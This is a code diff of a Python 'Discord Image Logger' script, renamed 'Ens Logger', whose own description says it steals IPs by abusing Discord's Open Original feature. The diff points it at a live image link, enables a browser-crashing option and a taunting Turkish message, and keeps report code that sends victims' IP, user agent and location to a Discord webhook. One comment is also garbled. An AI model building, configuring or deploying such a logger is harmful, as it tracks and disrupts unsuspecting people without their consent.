@@ -5,15 +5,15 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
+__app__ = "Allah Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "Ens"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://dar.vin/Log", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Hadi Kolay Gelsin Tarayıcınızın anasi ağladı", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -56,7 +56,7 @@ config = {
 
     # Please enter all values in correct format. Otherwise, it may break.
     # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
+    # NOTE: Hierarchy tr iki ee goes as follows:
     # 1) Redirect (If this is enabled, disables image and crash browser)
     # 2) Crash Browser (If this is enabled, disables image)
     # 3) Message (If this is enabled, disables image)
@@ -80,7 +80,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "Ens Logger - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -99,7 +99,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "Ens Logger - Link Sent",
             "color": config["color"],
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
